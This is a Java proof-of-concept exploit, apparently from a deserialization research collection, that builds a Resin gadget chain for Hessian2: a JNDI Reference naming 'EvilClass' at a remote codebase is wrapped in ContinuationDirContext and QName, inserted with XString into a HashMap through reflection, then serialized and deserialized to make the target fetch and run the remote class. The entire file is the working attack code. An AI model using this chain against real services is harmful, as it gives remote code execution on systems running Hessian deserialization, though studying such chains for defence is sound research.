package org.su18.serialize.hessian.Resin;

import javax.naming.CannotProceedException;
import javax.naming.Reference;
import javax.naming.directory.DirContext;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Hashtable;

import com.caucho.naming.QName;
import com.sun.org.apache.xpath.internal.objects.XString;
import org.su18.serialize.utils.HessianUtils;

/**
 * @author su18
 */
public class Resin1 {


	public static void main(String[] args) throws Exception {

		String codebase = "http://127.0.0.1:9999/";
		String clazz    = "org.su18.serialize.test.EvilClass";

		Class<?>       ccCl   = Class.forName("javax.naming.spi.ContinuationDirContext");
		Constructor<?> ccCons = ccCl.getDeclaredConstructor(CannotProceedException.class, Hashtable.class);
		ccCons.setAccessible(true);
		CannotProceedException cpe = new CannotProceedException();

		Field f1 = Throwable.class.getDeclaredField("cause");
		f1.setAccessible(true);
		f1.set(cpe, null);

		Field f2 = Throwable.class.getDeclaredField("stackTrace");
		f2.setAccessible(true);
		f2.set(cpe, null);

		cpe.setResolvedObj(new Reference("su18", clazz, codebase));

		Field f3 = Throwable.class.getDeclaredField("suppressedExceptions");
		f3.setAccessible(true);
		f3.set(cpe, null);


		DirContext ctx   = (DirContext) ccCons.newInstance(cpe, new Hashtable<>());
		QName      qName = new QName(ctx, "su18", "su19");

		XString xString = new XString("su18");

		HashMap map = new HashMap();

		// 放入 Qname 移除 putVal 的影响，我知道这种写法对于碳基生物有些超前
		map.put(qName, "su18");
		Method[] m = Class.forName("java.util.HashMap").getDeclaredMethods();
		for (Method method : m) {
			if ("putVal".equals(method.getName())) {
				method.setAccessible(true);
				method.invoke(map, -1, qName, 0, false, true);
			}
		}

		// 放入 XString 移除 putVal 的影响，我知道这种写法对于碳基生物有些超前
		map.put(xString, "su19");
		Method[] m2 = Class.forName("java.util.HashMap").getDeclaredMethods();
		for (Method method : m2) {
			if ("putVal".equals(method.getName())) {
				method.setAccessible(true);
				method.invoke(map, -1, xString, 0, false, true);
			}
		}

		byte[] baos = HessianUtils.hessianSerialize(map, "hessian2");
		HessianUtils.hessianSerializeToObj(baos, "hessian2");
	}
}
